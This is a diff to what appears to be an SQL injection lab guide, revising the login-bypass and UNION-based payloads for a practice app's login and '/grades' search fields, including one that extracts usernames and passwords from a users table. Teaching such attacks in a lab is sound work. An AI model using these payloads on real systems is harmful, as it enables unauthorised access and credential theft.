@@ -102,7 +102,7 @@ Because `'1'='1'` is always true, the entire `WHERE` clause evaluates to true fo
 
 In the username field, enter:
 ```
-' OR '1'='1
+' OR '1'='1' -- 
 ```
 In the password field, enter anything. Attempt to log in. Document the result.
 
@@ -121,12 +121,12 @@ A UNION attack appends a second SELECT statement to the original query, causing 
 
 Navigate to `/grades` and use the search field. Enter:
 ```
-' UNION SELECT 1,2,3,4,5,6--
+%') UNION SELECT 1,2,3,4,5,6 -- 
 ```
 
 If you receive a column count error, adjust the number of fields until the query succeeds. Then use a payload that extracts data:
 ```
-' UNION SELECT username, password, email, role, 1, 1 FROM users--
+%') UNION SELECT 1,username,1,password,email,role,1 FROM users -- 
 ```
 
 Document what data is returned.
